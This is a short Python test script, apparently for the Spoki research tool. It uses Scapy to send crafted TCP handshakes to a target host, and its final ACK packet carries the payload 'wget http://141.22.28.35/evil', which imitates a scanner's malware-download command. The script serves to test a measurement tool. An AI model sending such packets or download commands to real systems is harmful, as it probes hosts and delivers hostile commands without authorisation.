#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
testing.py: Test interaction with Spoki.
"""

__maintainer__ = "Raphael Hiesgen"
__email__ = "raphael.hiesgen@haw-hamburg.de"
__copyright__ = "Copyright 2018-2021"

import click
import logging

from enum import Enum

# Scapy
from scapy.all import IP, TCP
from scapy.all import sr1, send, sniff


# -- config -------------------------------------------------------------------

# logging.getLogger("scapy").setLevel(logging.CRITICAL)
# logging.getLogger("scapy").setLevel(logging.ERROR)

@click.command()
@click.argument(
    "host",
    type=str,
)
# -- options -----------
@click.option(
    "-p",
    "--port",
    "port",
    default=42,
    help="contact Spoki on the given port",
    type=int,
)
def main(host, port):
    filter = f"ip src host {host}"

    # Irregular Handshake, no ACK.
    print()
    print(f"# Starting irregular handshake to '{host}:{port}'")
    irregular_syn = IP(dst=host, ttl=231, id=61602) / TCP(sport=22734, dport=port, flags="S", seq=1298127, options=b"")
    print(f"sending irregular SYN: {irregular_syn.summary()}")
    resp = sr1(irregular_syn, filter=filter)
    print(resp[0].summary())


    print()
    print(f"# Received SYN ACK, starting regular handshake")
    # Regular Handshake, with payload in ACK.
    opts = [('MSS', 1460), ('NOP', None), ('WScale', 6), ('NOP', None), ('NOP', None), ('Timestamp', (1220406720, 0)), ('SAckOK', b''), ('EOL', None)]
    regular_syn = IP(dst=host, ttl=64, id=20202) / TCP(sport=41725, dport=port, flags="S", seq=1298130, options=opts)
    resp = sr1(regular_syn, filter=filter)
    print(resp[0].summary())

    pkt = resp[0]
    acknum = pkt[TCP].seq

    print()
    print(f"# Delivering payload with ACK, starting regular handshake")
    ack = IP(dst=host, ttl=64, id=11727) / TCP(sport=41725, dport=port, flags="A", seq=1298131, ack=acknum, options=b"")/"wget http://141.22.28.35/evil"
    resp = sr1(ack, filter=filter)
    print(resp[0].summary())


    print()
    print(f"DONE")

